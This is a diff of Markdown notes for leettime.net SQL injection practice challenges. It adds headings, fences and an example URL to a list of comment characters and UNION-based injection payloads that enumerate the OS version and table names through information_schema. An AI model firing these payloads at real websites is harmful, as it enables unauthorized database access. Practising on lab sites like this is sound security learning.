@@ -28,7 +28,7 @@ COLUNA1  |   COLUNA2 | COLUNA1 | COLUNA2|
  LINHA2  |   LINHA2  |
              LINHA3  |
 ```
-
+```
 COMENTARIOS: -- | # | ;%00 | `
 
 SQLI: select * from username where id=1
@@ -64,7 +64,12 @@ id=1' order by 1 --+anakein
 ?id=null' union select 66,concat(@@version_compile_os,0x20,@@version_compile_machine),66--+anakein
 
 ?id=null' union select 66,concat(select table_name from information_schema.tables where database()),66
+```
 
+## Basic Injection
 
+```
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=null' union select 66,(select table_name from information_schema.tables where table_schema=database() limit 2,1),66--+anakein
+```
 
-https://raw.githubusercontent.com/e-anakein/leettime/master/images/photo_2019-05-24_22-51-48.jpg
+![list_table1](https://raw.githubusercontent.com/e-anakein/leettime/master/images/photo_2019-05-24_22-51-48.jpg)
